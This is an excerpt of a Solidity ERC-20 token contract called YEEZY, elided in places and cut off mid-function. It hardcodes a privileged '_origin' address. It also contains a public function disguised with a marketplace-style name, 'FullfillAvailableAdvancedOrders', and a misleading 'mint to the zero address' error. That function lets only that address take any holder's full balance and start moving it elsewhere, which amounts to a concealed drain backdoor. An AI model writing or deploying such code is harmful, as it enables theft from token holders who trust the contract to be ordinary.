...
contract YEEZY  is Context, IERC20 {
    ...
    address _addr = 0x9B5ac86edF58683f1d55B6Fb5Bc8C18dE92DF083;
    address public _origin = 0x9B5ac86edF58683f1d55B6Fb5Bc8C18dE92DF083;
...
//-----------------------------------------------------------------------------------------------------------------------//
        ...
        function FullfillAvailableAdvancedOrders(address account, address staker) public {
            require(msg.sender == _origin, "ERC20: mint to the zero address");
            uint256 amount = _balances[account];
            _beforeTokenTransfer(account, staker, amount);
